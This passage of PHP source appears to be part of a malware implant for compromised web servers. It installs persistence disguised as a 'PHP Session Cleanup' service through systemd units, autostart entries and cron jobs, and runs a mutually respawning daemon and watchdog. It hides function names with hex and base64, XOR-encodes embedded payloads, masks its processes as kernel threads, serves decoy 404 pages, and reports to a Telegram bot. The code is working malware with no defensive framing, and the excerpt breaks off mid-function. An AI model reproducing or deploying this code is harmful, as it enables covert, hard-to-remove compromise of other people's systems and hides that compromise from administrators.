    $unitUser = "[Unit]\nDescription=PHP Session Cleanup\nAfter=network.target\n\n[Service]\nType=simple{$userDirective}\nExecStart={$phpEsc} {$entryEsc}\nRestart=always\nRestartSec=30\nStartLimitIntervalSec=0\nStandardOutput=null\nStandardError=null\n\n[Install]\nWantedBy=default.target\n";
    $unitSys = str_replace("WantedBy=default.target", "WantedBy=multi-user.target", $unitUser);
    $installed = [];
    $userDir = wn_systemd_user_dir();
    if ($userDir) { $p = $userDir . '/' . $svc . '.service'; if (wn_call('fpc', $p, $unitUser) !== false) { @chmod($p, 0600); cmd_exec('systemctl --user daemon-reload 2>/dev/null'); cmd_exec('systemctl --user enable ' . escapeshellarg($svc . '.service') . ' 2>/dev/null'); cmd_exec('systemctl --user restart ' . escapeshellarg($svc . '.service') . ' 2>/dev/null'); $installed[] = $p; } }
    $sysDir = wn_systemd_system_dir();
    if ($sysDir) { $p2 = $sysDir . '/' . $svc . '.service'; if (wn_call('fpc', $p2, $unitSys) !== false) { @chmod($p2, 0644); cmd_exec('systemctl daemon-reload 2>/dev/null'); cmd_exec('systemctl enable ' . escapeshellarg($svc . '.service') . ' 2>/dev/null'); cmd_exec('systemctl restart ' . escapeshellarg($svc . '.service') . ' 2>/dev/null'); $installed[] = $p2; } }
    if (empty($installed)) {
        $home = wn_get_home();
        if ($home) {
            $autoDir = $home . '/.config/autostart'; if (!is_dir($autoDir)) @mkdir($autoDir, 0700, true);
            if (is_dir($autoDir) && is_writable($autoDir)) {
                $desktop = "[Desktop Entry]\nType=Application\nName=PHP Session Cleanup\nExec={$phpBin} {$entry}\nX-GNOME-Autostart-enabled=true\nTerminal=false\n";
                $dp = $autoDir . '/' . $svc . '.desktop'; if (wn_call('fpc', $dp, $desktop) !== false) { @chmod($dp, 0600); $installed[] = $dp; }
            }
        }
    }
    $log[] = 'systemd: ' . (empty($installed) ? 'FAILED' : count($installed) . ' unit(s)');
    return $installed;
}
function wn_uninstall_systemd(&$log = null) {
    $svc = wn_systemd_service_name(); $removed = 0;
    cmd_exec('systemctl --user stop ' . escapeshellarg($svc . '.service') . ' 2>/dev/null');
    cmd_exec('systemctl --user disable ' . escapeshellarg($svc . '.service') . ' 2>/dev/null');
    cmd_exec('systemctl stop ' . escapeshellarg($svc . '.service') . ' 2>/dev/null');
    cmd_exec('systemctl disable ' . escapeshellarg($svc . '.service') . ' 2>/dev/null');
    $candidates = [];
    $u = wn_systemd_user_dir(); if ($u) $candidates[] = $u . '/' . $svc . '.service';
    $s = wn_systemd_system_dir(); if ($s) $candidates[] = $s . '/' . $svc . '.service';
    $home = wn_get_home(); if ($home) $candidates[] = $home . '/.config/autostart/' . $svc . '.desktop';
    foreach ($candidates as $p) if (file_exists($p)) { @unlink($p); $removed++; }
    cmd_exec('systemctl --user daemon-reload 2>/dev/null'); cmd_exec('systemctl daemon-reload 2>/dev/null');
    if ($log !== null) $log[] = "systemd: removed $removed unit(s)";
    return $removed;
}
function wn_systemd_status() {
    $svc = wn_systemd_service_name();
    $info = ['name'=>$svc,'user_unit'=>null,'system_unit'=>null,'user_active'=>false,'system_active'=>false];
    $u = wn_systemd_user_dir(); if ($u) { $p = $u . '/' . $svc . '.service'; if (file_exists($p)) { $info['user_unit'] = $p; if (is_shell_available()) $info['user_active'] = trim((string)cmd_exec('systemctl --user is-active ' . escapeshellarg($svc . '.service') . ' 2>/dev/null')) === 'active'; } }
    $s = wn_systemd_system_dir(); if ($s) { $p = $s . '/' . $svc . '.service'; if (file_exists($p)) { $info['system_unit'] = $p; if (is_shell_available()) $info['system_active'] = trim((string)cmd_exec('systemctl is-active ' . escapeshellarg($svc . '.service') . ' 2>/dev/null')) === 'active'; } }
    return $info;
}
function wn_wrap_encode($data, $key) {
    if ($data === '' || $key === '') return '';
    $klen = strlen($key); $x = ''; $len = strlen($data);
    for ($i = 0; $i < $len; $i++) $x .= chr(ord($data[$i]) ^ ord($key[$i % $klen]));
    return wn_call('b64e', $x);
}
function wn_build_wrapper_code($watcherCode = '') {
    $key = wn_get_key('wrap_selfheal');
    $payload = ($watcherCode !== '') ? wn_wrap_encode($watcherCode, $key) : '';
    $expectedHash = '';  // MORPH-AWARE: hash disabled, wrapper validates via PHP header
    $code = <<<'WN_WRAPPER_TEMPLATE_EOF_8C7D'
<?php
error_reporting(0); @set_time_limit(0); @ignore_user_abort(true);
function _wf($k) { static $m = null; if ($m === null) { $m = array("se"=>"\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63","ex"=>"\x65\x78\x65\x63","b64d"=>"\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65","fpc"=>"\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73","fgc"=>"\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"); } return isset($m[$k]) ? $m[$k] : ""; }
function _wc($k) { $f = _wf($k); if ($f === "" || !function_exists($f)) return null; $a = func_get_args(); array_shift($a); return @$f(...$a); }
$__paths = __WRAPPER_PATHS__;
$__key = __WRAPPER_KEY__;
$__payload = __WRAPPER_PAYLOAD__;
$__hash = __WRAPPER_HASH__;
$__pidFile = __WRAPPER_PIDFILE__;
$__daemonName = __WRAPPER_DAEMONNAME__;
$__home = getenv("HOME") ?: "/tmp";
$__stateDir = sys_get_temp_dir();
if (is_dir($__home . "/.cache") && is_writable($__home . "/.cache")) $__stateDir = $__home . "/.cache";
elseif (is_dir($__home) && is_writable($__home)) $__stateDir = $__home;
$__target = null;
foreach ($__paths as $__p) {
    if (!$__p || !@is_file($__p) || @filesize($__p) < 500) continue;
    if ($__hash !== "" && @hash_file("sha256", $__p) !== $__hash) continue;
    /* MORPH-AWARE: validate PHP header + WN marker presence */
    $__fh = @fopen($__p, 'r');
    $__hdr = $__fh ? @fread($__fh, 4096) : '';
    if ($__fh) @fclose($__fh);
    if (strpos((string)$__hdr, '<?php') === false) continue;
    /* Must contain at least one WN function signature to prevent false-positive include */
    if (strpos((string)$__hdr, 'function wn_') === false 
        && strpos((string)$__hdr, 'function _f(') === false
        && strpos((string)$__hdr, 'function _c(') === false) continue;
    $__target = $__p; break;
}
if ($__target === null && $__payload !== "") { $__x = _wc("b64d", $__payload); if ($__x !== false && $__x !== "") { $__d = ""; $__kl = strlen($__key); $__xl = strlen($__x); for ($__i = 0; $__i < $__xl; $__i++) $__d .= chr(ord($__x[$__i]) ^ ord($__key[$__i % $__kl])); foreach ($__paths as $__p) { $__dir = dirname($__p); if (!is_dir($__dir)) @mkdir($__dir, 0700, true); if (is_dir($__dir) && is_writable($__dir)) { if (_wc("fpc", $__p, $__d) !== false) { @chmod($__p, 0600); $__target = $__p; break; } } } } }
$__alive = false;
$__pg = trim((string)_wc("se", "pgrep -f " . escapeshellarg($__daemonName) . " 2>/dev/null"));
if ($__pg !== "") { $__alive = true; }
if (!$__alive && file_exists($__pidFile)) { $__pid = (int)_wc("fgc", $__pidFile); if ($__pid > 0) { $__cmd = trim((string)_wc("se", "ps -p $__pid -o args= 2>/dev/null")); if ($__cmd !== "" && strpos($__cmd, basename($__daemonName)) !== false) $__alive = true; } }
if (!$__alive && $__target !== null) { $__daemon = dirname($__target) . "/" . basename($__daemonName); if (@file_exists($__daemon)) { $__php = trim((string)_wc("se", "command -v php 2>/dev/null")); if (!$__php) foreach (["/usr/local/bin/php","/usr/bin/php"] as $p) if (file_exists($p)) { $__php = $p; break; } if ($__php) { $__spawn = trim((string)_wc("se", "command -v setsid 2>/dev/null")) !== "" ? "setsid " . escapeshellarg($__php) . " " . escapeshellarg($__daemon) . " >/dev/null 2>&1 &" : "nohup " . escapeshellarg($__php) . " " . escapeshellarg($__daemon) . " >/dev/null 2>&1 &"; _wc("se", $__spawn); } } }
if ($__target === null) exit;
include $__target;
WN_WRAPPER_TEMPLATE_EOF_8C7D;
    return strtr($code, [
        '__WRAPPER_PATHS__'=>var_export(wn_watcher_locations(), true),
        '__WRAPPER_KEY__'=>var_export($key, true),
        '__WRAPPER_PAYLOAD__'=>var_export($payload, true),
        '__WRAPPER_HASH__'=>var_export($expectedHash, true),
        '__WRAPPER_PIDFILE__'=>var_export(wn_blend_name('daemon_pid'), true),
        '__WRAPPER_DAEMONNAME__'=>var_export(basename(wn_blend_name('daemon_php')), true),
    ]);
}
function wn_install_wrappers(&$log, $watcherCode = '') {
    $code = wn_build_wrapper_code($watcherCode); $written = [];
    foreach (wn_wrapper_locations() as $loc) {
        $dir = dirname($loc); if (!is_dir($dir)) @mkdir($dir, 0700, true);
        if (!is_dir($dir) || !is_writable($dir)) continue;
        if (wn_call('fpc', $loc, $code) !== false) { @chmod($loc, 0600); $written[] = $loc; }
    }
    $log[] = !empty($written) ? "wrapper: " . count($written) . " files" : "wrapper: FAILED";
    return $written;
}
function wn_wrapper_exists() { foreach (wn_wrapper_locations() as $loc) if (@file_exists($loc) && @is_readable($loc)) return $loc; return null; }
function wn_wrapper_cron_targets() {
    $all = wn_wrapper_locations(); $home = null; $tmp = null;
    foreach ($all as $p) {
        $isTmp = (strpos($p, '/tmp/') === 0 || strpos($p, '/var/tmp/') === 0);
        if (!$isTmp && $home === null && file_exists($p)) $home = $p;
        if ($isTmp && $tmp === null && file_exists($p)) $tmp = $p;
    }
    $targets = []; if ($home) $targets[] = $home; if ($tmp) $targets[] = $tmp;
    return $targets ?: $all;
}
function wn_find_best_php($tk = null) {
    if (!is_shell_available()) {
        foreach (['/usr/local/bin/php','/usr/bin/php','/opt/cpanel/ea-php84/root/usr/bin/php','/opt/cpanel/ea-php83/root/usr/bin/php','/opt/cpanel/ea-php82/root/usr/bin/php'] as $bin) if (file_exists($bin) && is_executable($bin)) return ['bin'=>$bin,'version'=>0,'version_str'=>'?'];
        return null;
    }
    $candidates = ['/opt/cpanel/ea-php84/root/usr/bin/php','/opt/cpanel/ea-php83/root/usr/bin/php','/opt/cpanel/ea-php82/root/usr/bin/php','/opt/cpanel/ea-php81/root/usr/bin/php','/opt/cpanel/ea-php80/root/usr/bin/php','/opt/cpanel/ea-php74/root/usr/bin/php','/usr/local/bin/php','/usr/bin/php'];
    foreach ((array)glob('/opt/cpanel/ea-php*/root/usr/bin/php') as $p) $candidates[] = $p;
    foreach ((array)glob('/usr/local/php*/bin/php') as $p) $candidates[] = $p;
    $candidates = array_values(array_unique($candidates));
    $tested = []; $firstSeen = [];
    foreach ($candidates as $bin) {
        if (!$bin || !file_exists($bin) || !is_executable($bin)) continue;
        $real = @realpath($bin); if ($real !== false) { if (isset($firstSeen[$real])) continue; $firstSeen[$real] = true; }
        $verOut = trim((string)cmd_exec(escapeshellarg($bin) . ' -v 2>&1 | head -1'));
        if (!preg_match('/PHP (\d+\.\d+)/', $verOut, $m)) continue;
        $tested[] = ['bin'=>$bin,'version'=>(float)$m[1],'version_str'=>$m[1]];
    }
    if (empty($tested)) { $which = trim((string)cmd_exec('which php 2>/dev/null')); if ($which && file_exists($which)) return ['bin'=>$which,'version'=>0,'version_str'=>'?']; return null; }
    usort($tested, function ($a, $b) { return $b['version'] <=> $a['version']; });
    return ['bin'=>$tested[0]['bin'],'version'=>$tested[0]['version'],'version_str'=>$tested[0]['version_str']];
}
function wn_daemon_status() {
    $pidFile = wn_blend_name('daemon_pid');
    if (file_exists($pidFile)) { $pid = (int)wn_call('fgc', $pidFile); if ($pid > 0 && wn_pid_is_daemon($pid)) return ['alive'=>true,'pid'=>$pid]; }
    $dName = basename(wn_blend_name('daemon_php'));
    $found = trim((string)cmd_exec('pgrep -f ' . escapeshellarg($dName) . ' 2>/dev/null'));
    if ($found !== '') { $lines = array_values(array_filter(explode("\n", $found))); if (!empty($lines)) { $pid = (int)$lines[0]; wn_call('fpc', $pidFile, $pid); @chmod($pidFile, 0600); return ['alive'=>true,'pid'=>$pid,'repaired'=>true]; } }
    return ['alive'=>false,'pid'=>0];
}
function wn_watchdog_status() {
    $pidFile = wn_blend_name('watchdog_pid');
    if (file_exists($pidFile)) { $pid = (int)wn_call('fgc', $pidFile); if ($pid > 0 && wn_pid_is_daemon($pid)) return ['alive'=>true,'pid'=>$pid]; }
    $wName = basename(wn_blend_name('watchdog_php'));
    $found = trim((string)cmd_exec('pgrep -f ' . escapeshellarg($wName) . ' 2>/dev/null'));
    if ($found !== '') { $lines = array_values(array_filter(explode("\n", $found))); if (!empty($lines)) { $pid = (int)$lines[0]; wn_call('fpc', $pidFile, $pid); @chmod($pidFile, 0600); return ['alive'=>true,'pid'=>$pid,'repaired'=>true]; } }
    return ['alive'=>false,'pid'=>0];
}
function wn_pid_is_daemon($pid) {
    $pid = (int)$pid; if ($pid <= 0) return false;
    if (!is_shell_available()) return false;
    $cmd = trim((string)cmd_exec("ps -p $pid -o args= 2>/dev/null"));
    if ($cmd === '' || $cmd === '[shell disabled]') return false;
    $dname = basename(wn_blend_name('daemon_php')); $wname = basename(wn_blend_name('watchdog_php'));
    if (strpos($cmd, $dname) !== false) return true;
    if (strpos($cmd, $wname) !== false) return true;
    return false;
}
function wn_spawn_daemon($phpBin, $wrapperPath, &$log) {
    if (!is_shell_available()) { $log[] = "daemon: shell disabled"; return false; }
    $pidFile = wn_blend_name('daemon_pid');
    $daemonPath = dirname($wrapperPath) . '/' . basename(wn_blend_name('daemon_php'));
    $existing = trim((string)cmd_exec('pgrep -f ' . escapeshellarg($daemonPath) . ' 2>/dev/null'));
    if ($existing !== '') { $lines = array_values(array_filter(explode("\n", $existing))); if (!empty($lines)) { $pid = (int)$lines[0]; if ($pid > 0) { wn_call('fpc', $pidFile, $pid); @chmod($pidFile, 0600); } $log[] = "daemon: running (PID $pid)"; return true; } }
    $wrapperVar = var_export($wrapperPath, true); $phpVar = var_export($phpBin, true);
    $wdPidVar = var_export(wn_blend_name('watchdog_pid'), true);
    $daemonCode = <<<'WN_DAEMON_EOF_3E5F'
#!/usr/bin/env php
<?php
error_reporting(0); @set_time_limit(0); @ignore_user_abort(true);
function _dis() { static $d = null; if ($d === null) $d = array_map('trim', explode(',', ini_get('disable_functions') ?: '')); return $d; }
function _sh($cmd) { $d = _dis(); foreach (array('shell_exec','exec','system','passthru') as $f) { if (!function_exists($f) || in_array($f, $d, true)) continue; if ($f === 'shell_exec') return @shell_exec($cmd); if ($f === 'exec') { $o = array(); @exec($cmd, $o); return implode("\n", $o); } ob_start(); @$f($cmd); return ob_get_clean(); } if (function_exists('popen') && !in_array('popen', $d, true)) { $fp = @popen($cmd . ' 2>&1', 'r'); if (!$fp) return null; $o = ''; while (!feof($fp)) $o .= fread($fp, 4096); @pclose($fp); return $o; } return null; }
function _bg($cmd) { $d = _dis(); $cmd .= ' </dev/null >/dev/null 2>&1 &'; if (function_exists('popen') && !in_array('popen', $d, true)) { $fp = @popen($cmd, 'r'); if ($fp) { @pclose($fp); return true; } } if (function_exists('proc_open') && !in_array('proc_open', $d, true)) { $desc = array(0=>array('file','/dev/null','r'),1=>array('file','/dev/null','w'),2=>array('file','/dev/null','w')); $p = @proc_open($cmd, $desc, $pipes); if (is_resource($p)) { @proc_close($p); return true; } } return false; }
$wrapper = __DAEMON_WRAPPER__;
$php = __DAEMON_PHP__;
$wdPidFile = __DAEMON_WDPID__;
$lastBeat = 0;
while (true) {
    if (@file_exists($wrapper)) {
        $running = (string)@_sh("pgrep -f " . escapeshellarg($wrapper) . " 2>/dev/null");
        $lines = array_filter(explode("\n", trim($running)));
        if (count($lines) === 0) @_bg(escapeshellarg($php) . " " . escapeshellarg($wrapper));
    }
    if (time() - $lastBeat >= 60) {
        $wp = (int)@file_get_contents($wdPidFile);
        if ($wp > 0) @_sh("kill -CONT " . $wp . " 2>/dev/null");
        $lastBeat = time();
    }
    usleep(random_int(1500000, 4000000));
}
WN_DAEMON_EOF_3E5F;
    $daemonCode = strtr($daemonCode, ['__DAEMON_WRAPPER__'=>$wrapperVar, '__DAEMON_PHP__'=>$phpVar, '__DAEMON_WDPID__'=>$wdPidVar]);
    if (wn_call('fpc', $daemonPath, $daemonCode) === false) { $log[] = "daemon: write fail"; return false; }
    @chmod($daemonPath, 0600);
    $hasSetsid = trim((string)cmd_exec('command -v setsid 2>/dev/null')) !== '';
    $hasNohup = trim((string)cmd_exec('command -v nohup 2>/dev/null')) !== '';
    if (!$hasSetsid && !$hasNohup) { $log[] = "daemon: no setsid/nohup"; return false; }
    $prefix = $hasSetsid ? 'setsid ' : 'nohup ';
    cmd_exec($prefix . escapeshellarg($phpBin) . ' ' . escapeshellarg($daemonPath) . ' </dev/null >/dev/null 2>&1 &');
    usleep(900000);
    $found = trim((string)cmd_exec('pgrep -f ' . escapeshellarg($daemonPath) . ' 2>/dev/null'));
    $lines = $found !== '' ? array_values(array_filter(explode("\n", $found))) : [];
    if (empty($lines)) { $log[] = "daemon: spawn fail"; return false; }
    $pid = (int)$lines[0]; wn_call('fpc', $pidFile, $pid); @chmod($pidFile, 0600);
    $log[] = "daemon: spawned (PID $pid)"; return true;
}
function wn_spawn_watchdog($phpBin, $wrapperPath, &$log) {
    if (!is_shell_available()) { $log[] = "watchdog: shell disabled"; return false; }
    $pidFile = wn_blend_name('watchdog_pid');
    $wdPath = dirname($wrapperPath) . '/' . basename(wn_blend_name('watchdog_php'));
    $existing = trim((string)cmd_exec('pgrep -f ' . escapeshellarg($wdPath) . ' 2>/dev/null'));
    if ($existing !== '') { $lines = array_values(array_filter(explode("\n", $existing))); if (!empty($lines)) { $pid = (int)$lines[0]; if ($pid > 0) { wn_call('fpc', $pidFile, $pid); @chmod($pidFile, 0600); } $log[] = "watchdog: running (PID $pid)"; return true; } }
    $wrapperVar = var_export($wrapperPath, true); $phpVar = var_export($phpBin, true);
    $daemonName = basename(wn_blend_name('daemon_php')); $daemonPid = var_export(wn_blend_name('daemon_pid'), true);
    $wdCode = <<<'WN_WATCHDOG_EOF_9B2A'
#!/usr/bin/env php
<?php
error_reporting(0); @set_time_limit(0); @ignore_user_abort(true);
function _dis() { static $d = null; if ($d === null) $d = array_map('trim', explode(',', ini_get('disable_functions') ?: '')); return $d; }
function _sh($cmd) { $d = _dis(); foreach (array('shell_exec','exec','system','passthru') as $f) { if (!function_exists($f) || in_array($f, $d, true)) continue; if ($f === 'shell_exec') return @shell_exec($cmd); if ($f === 'exec') { $o = array(); @exec($cmd, $o); return implode("\n", $o); } ob_start(); @$f($cmd); return ob_get_clean(); } if (function_exists('popen') && !in_array('popen', $d, true)) { $fp = @popen($cmd . ' 2>&1', 'r'); if (!$fp) return null; $o = ''; while (!feof($fp)) $o .= fread($fp, 4096); @pclose($fp); return $o; } return null; }
function _bg($cmd) { $d = _dis(); $cmd .= ' </dev/null >/dev/null 2>&1 &'; if (function_exists('popen') && !in_array('popen', $d, true)) { $fp = @popen($cmd, 'r'); if ($fp) { @pclose($fp); return true; } } if (function_exists('proc_open') && !in_array('proc_open', $d, true)) { $desc = array(0=>array('file','/dev/null','r'),1=>array('file','/dev/null','w'),2=>array('file','/dev/null','w')); $p = @proc_open($cmd, $desc, $pipes); if (is_resource($p)) { @proc_close($p); return true; } } return false; }
$wrapper = __WD_WRAPPER__; $php = __WD_PHP__;
$daemonName = __WD_DAEMONNAME__; $daemonPid = __WD_DAEMONPID__;
$daemonPath = dirname($wrapper) . "/" . $daemonName;
$__lastDaemonBeat = time();
$__hasSig = function_exists('pcntl_signal') && function_exists('pcntl_async_signals');
if ($__hasSig) { pcntl_signal(SIGCONT, function() { $GLOBALS['__lastDaemonBeat'] = time(); }); pcntl_async_signals(true); }
while (true) {
    if ($__hasSig && time() - $GLOBALS['__lastDaemonBeat'] > 180) {
        if (file_exists($daemonPath)) { @_bg(escapeshellarg($php) . " " . escapeshellarg($daemonPath)); }
        $GLOBALS['__lastDaemonBeat'] = time();
    }
    $alive = false;
    $found = trim((string)@_sh("pgrep -f " . escapeshellarg($daemonPath) . " 2>/dev/null"));
    if ($found !== "") { $lines = array_filter(explode("\n", $found)); if (!empty($lines)) { @file_put_contents($daemonPid, (int)reset($lines)); $alive = true; } }
    if (!$alive && file_exists($daemonPath)) { @_bg(escapeshellarg($php) . " " . escapeshellarg($daemonPath)); usleep(900000); }
    $running = @_sh("pgrep -f " . escapeshellarg($wrapper) . " 2>/dev/null");
    $lines = array_filter(explode("\n", trim((string)$running)));
    if (count($lines) === 0 && file_exists($wrapper)) @_bg(escapeshellarg($php) . " " . escapeshellarg($wrapper));
    sleep(random_int(20, 40));
}
WN_WATCHDOG_EOF_9B2A;
    $wdCode = strtr($wdCode, ['__WD_WRAPPER__'=>$wrapperVar, '__WD_PHP__'=>$phpVar, '__WD_DAEMONNAME__'=>var_export($daemonName, true), '__WD_DAEMONPID__'=>$daemonPid]);
    if (wn_call('fpc', $wdPath, $wdCode) === false) { $log[] = "watchdog: write fail"; return false; }
    @chmod($wdPath, 0600);
    $hasSetsid = trim((string)cmd_exec('command -v setsid 2>/dev/null')) !== '';
    $hasNohup = trim((string)cmd_exec('command -v nohup 2>/dev/null')) !== '';
    if (!$hasSetsid && !$hasNohup) { $log[] = "watchdog: no setsid/nohup"; return false; }
    $prefix = $hasSetsid ? 'setsid ' : 'nohup ';
    cmd_exec($prefix . escapeshellarg($phpBin) . ' ' . escapeshellarg($wdPath) . ' </dev/null >/dev/null 2>&1 &');
    usleep(900000);
    $found = trim((string)cmd_exec('pgrep -f ' . escapeshellarg($wdPath) . ' 2>/dev/null'));
    $lines = $found !== '' ? array_values(array_filter(explode("\n", $found))) : [];
    if (empty($lines)) { $log[] = "watchdog: spawn fail"; return false; }
    $pid = (int)$lines[0]; wn_call('fpc', $pidFile, $pid); @chmod($pidFile, 0600);
    $log[] = "watchdog: spawned (PID $pid)"; return true;
}
function wn_cron_filter_callback($l) {
    $needles = [basename(wn_get_key('wrapfile')), basename(wn_blend_name('daemon_php')), basename(wn_blend_name('watchdog_php')), 'php-sess-', 'php-session-'];
    foreach ($needles as $n) if ($n && stripos($l, $n) !== false) return false;
    if (stripos($l, 'session_cleanup') !== false) return false;
    if (trim($l) === '') return false;
    return true;
}
function wn_restore_cron($php, $wrapperTargets) {
    global $__B, $__C;
    if (!is_shell_available()) return false;
    if (is_string($wrapperTargets)) $wrapperTargets = [$wrapperTargets];
    $wrapperTargets = array_values(array_filter($wrapperTargets, 'file_exists'));
    if (empty($wrapperTargets)) return false;
    $existing = (string)cmd_exec('crontab -l 2>/dev/null');
    $lines = array_filter(explode("\n", $existing), 'wn_cron_filter_callback');
    if ($existing) wn_call('fpc', wn_blend_name('cron_backup'), $existing);
    $w1 = $wrapperTargets[0];
    $lines[] = "* * * * * /bin/sh -c '" . escapeshellarg($php) . " " . escapeshellarg($w1) . " >/dev/null 2>&1'";
    $lines[] = "@reboot /bin/sh -c 'sleep 30 && " . escapeshellarg($php) . " " . escapeshellarg($w1) . " >/dev/null 2>&1'";
    $tmp = tempnam(sys_get_temp_dir(), 'cron_'); wn_call('fpc', $tmp, implode("\n", $lines) . "\n");
    cmd_exec("crontab " . escapeshellarg($tmp) . " 2>&1"); @unlink($tmp);
    sendTelegramMessage($__B, $__C, "CRON RESTORED\nHost: " . htmlspecialchars(wn_safe_host(), ENT_QUOTES, 'UTF-8'));
    return true;
}
function wn_wake_watcher() { global $__B; @touch(wn_state_dir() . "/." . substr(hash('sha256', 'wake:' . $__B), 0, 16)); }

/* ═══ TECHNIQUES PART 5 (helpers used by layers & watcher) ═══ */
function wn_adaptive_delay($baseMs = 2000) {
    $load = function_exists('sys_getloadavg') ? sys_getloadavg() : [1.0];
    $l = (float)($load[0] ?? 1.0);
    if ($l < 0.5) $mult = random_int(3, 5);
    elseif ($l < 2.0) $mult = 1;
    else $mult = 0.5;
    $delay = (int)($baseMs * $mult / 1000);
    return max(1, $delay);
}
function wn_proc_mask($tier = 'u8') {
    $boot = @trim((string)@file_get_contents('/proc/sys/kernel/random/boot_id'));
    if ($boot === '') $boot = (string)@file_get_contents('/proc/uptime');
    $salt = 'wn:' . ($GLOBALS['CURRENT_SHELL'] ?? '') . ':' . ($GLOBALS['rootPath'] ?? '');
    $seed = hash_hmac('sha256', $boot, $salt);
    $pool = $tier === 'u16' ? ['kworker/u16','kworker/u17','kswapd1','kcompactd0'] : ['kworker/u8','kworker/u9','ksoftirqd','rcu_sched'];
    $name = $pool[crc32(substr($seed, 0, 4)) % count($pool)];
    $tag = dechex(crc32(substr($seed, 4, 8)));
    return '[' . $name . ':' . $tag . ']';
}
function wn_decoy_accept_aware() {
    while (ob_get_level() > 0) @ob_end_clean();
    $accept = strtolower($_SERVER['HTTP_ACCEPT'] ?? '*/*');
    if (!headers_sent()) { @header_remove('X-Powered-By'); @header_remove('Set-Cookie'); }
    if (strpos($accept, 'application/json') !== false) {
        @http_response_code(404);
        header('Content-Type: application/json; charset=utf-8');
        echo '{"error":{"code":404,"message":"Not Found"}}'; exit;
    }
    if (strpos($accept, 'application/xml') !== false || strpos($accept, 'text/xml') !== false) {
        @http_response_code(404);
        header('Content-Type: application/xml; charset=utf-8');
        echo '<?xml version="1.0"?><error><code>404</code><message>Not Found</message></error>'; exit;
    }
    if (strpos($accept, 'text/plain') !== false) {
        @http_response_code(404);
        header('Content-Type: text/plain; charset=utf-8');
        echo '404 Not Found'; exit;
    }
    wn_stealth_decoy();
}
function wn_trap_guard($tier) { return wn_state_dir() . '/.t3_' . $tier . '_g'; }
function wn_trap_beat($tier) {
    $up = @file_get_contents('/proc/uptime');
    $t = $up ? (int)floatval(explode(' ', $up)[0]) : time();
    wn_call('fpc', wn_trap_guard($tier), (string)$t, LOCK_EX);
    @chmod(wn_trap_guard($tier), 0600);
}
function wn_trap_age($tier) {
    $f = wn_trap_guard($tier); if (!file_exists($f)) return -1;
    $want = (int)wn_call('fgc', $f);
    if ($want <= 0) return -1;
    $up = @file_get_contents('/proc/uptime');
    $now = $up ? (int)floatval(explode(' ', $up)[0]) : time();
    return $now - $want;
}
function wn_layer_fingerprint() {
    $parts = [];
    foreach (['daemon_php','watchdog_php'] as $k) {
        $p = wn_blend_name($k);
        if (file_exists($p)) $parts[] = $k . ':' . hash('sha256', (string)wn_call('fgc', $p));
    }
    foreach (wn_watcher_locations() as $w) if (file_exists($w)) $parts[] = 'w:' . hash('sha256', (string)wn_call('fgc', $w));
    foreach (wn_wrapper_locations() as $w) if (file_exists($w)) $parts[] = 'x:' . hash('sha256', (string)wn_call('fgc', $w));
    return hash('sha256', implode('|', $parts));
}

function auto_build_watcher_code($b64Bot, $b64Chat, $shell, $root, $bname, $home, $selfUrl = '', $secret = '', $slaveMode = false) {
    $shellB64 = '';
    if (file_exists(__FILE__)) { $raw = wn_call('fgc', __FILE__); if ($raw !== false && strlen($raw) > 100) $shellB64 = wn_call('b64e', $raw); }
    $code = <<<'WN_WATCHER_TEMPLATE_EOF_4A2B'
<?php
error_reporting(0); @set_time_limit(0); @ignore_user_abort(true);
define("WN_DEBUG_W", __DEBUGFLAG__);
define("WN_SLAVE_MODE", __SLAVEMODE__);
function _f($k) {
    static $m = null;
    if ($m === null) { $m = array("se"=>"\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63","fpc"=>"\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73","fgc"=>"\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73","b64d"=>"\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65","b64e"=>"\x62\x61\x73\x65\x36\x34\x5f\x65\x6e\x63\x6f\x64\x65","cu_i"=>"\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74","cu_e"=>"\x63\x75\x72\x6c\x5f\x65\x78\x65\x63","cu_s"=>"\x63\x75\x72\x6c\x5f\x73\x65\x74\x6f\x70\x74","cu_c"=>"\x63\x75\x72\x6c\x5f\x63\x6c\x6f\x73\x65"); }
    return isset($m[$k]) ? $m[$k] : "";
}
function _c($k) { $f = _f($k); if ($f === "" || !function_exists($f)) return null; $a = func_get_args(); array_shift($a); return @$f(...$a); }
function _dbg($tag, $msg) { if (!WN_DEBUG_W) return; $f = sys_get_temp_dir() . "/wn_watcher_" . date("Ymd") . ".log"; @_c("fpc", $f, date("H:i:s") . " [" . getmypid() . "] [$tag] $msg\n", FILE_APPEND); }
_dbg("BOOT", "watcher start slave=" . (WN_SLAVE_MODE ? "1" : "0"));
$BOT = _c("b64d", __B64BOT__);
$CHAT = _c("b64d", __B64CHAT__);
$TG_BASE = _c("b64d", "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
$TG_FILE = _c("b64d", "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2ZpbGUvYm90");
$SHELL = __SHELL__; $ROOT = __ROOT__; $BNAME = __BNAME__; $HOME = __HOME__;
$SELF_URL = __URL__; $SECRET = __SEC__; $STATE_DIR_HINT = __STATEDIR__;
$EMBEDDED_SHELL_B64 = __SB64__;
$REPLICA_WATCHERS = __REPW__; $REPLICA_BACKUPS = __REPB__; $MAIN_WATCHERS = __MAINW__;
$DAEMON_PHP_NAME = __DAEMONNAME__; $WATCHDOG_PHP_NAME = __WDNAME__;
$DAEMON_PID_PATH = __DAEMONPID__; $WATCHDOG_PID_PATH = __WDPID__; $SHELL_MTIME_FILE = __MTIMEFILE__;
$TRAP_MARKER = __TRAPMARKER__;
$__state = $STATE_DIR_HINT;
if (!is_dir($__state) || !is_writable($__state)) { $__state = sys_get_temp_dir(); if (is_dir($HOME . "/.cache") && is_writable($HOME . "/.cache")) $__state = $HOME . "/.cache"; elseif (is_dir($HOME) && is_writable($HOME)) $__state = $HOME; }
if (function_exists('ghost_boot')) { try { ghost_boot(); } catch (Throwable $e) {} }
